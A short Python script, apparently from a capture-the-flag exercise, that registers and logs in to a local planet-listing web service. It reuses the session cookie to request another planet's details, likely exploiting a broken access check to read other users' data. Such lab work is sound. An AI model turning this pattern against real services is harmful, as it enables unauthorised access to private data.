import requests
import re

ip = "http://127.0.0.1"
target = "http://127.0.0.1:8000"

username = "veryUniqueUN"
password = "veryUniquePW"

def register():
    print("Start registration  U: " + username + "  P: " + password, flush=True)
    data = {'username': username, 'password': password}
    resp = requests.post(target + '/register', data)


def login():
    print("loging in")
    data = {'username': username, 'password': password}
    print("finished loging in")

    resp = requests.post(target +'/login', data)
    cookie = resp.cookies["session"]
    print(cookie)

    # print(cookie)
    planetNames = []
    for line in resp.text.split("\n"):
        if("/planet_details?n" in line):
            # print(line)

            m = re.search('Name: (.+?)</a>', line)
            if m:
                n = m.group(1)
                planetNames.append(n)
    print(planetNames)




    return planetNames, cookie


def getPlanetDetails(planetName, cookie):
    # sessions = requests.session()
    # print(sessions.cookies.get_dict())
    #
    headers = {"cookie" : "session=" + cookie}
    resp = requests.get(target +'/planet_details?name=' + planetName, headers = headers)
    print(resp.text)





def exploit():
    register()
    planetNames, cookie = login()
    planetName = planetNames[1]

    getPlanetDetails(planetName, cookie)


if __name__ == "__main__":
    exploit()
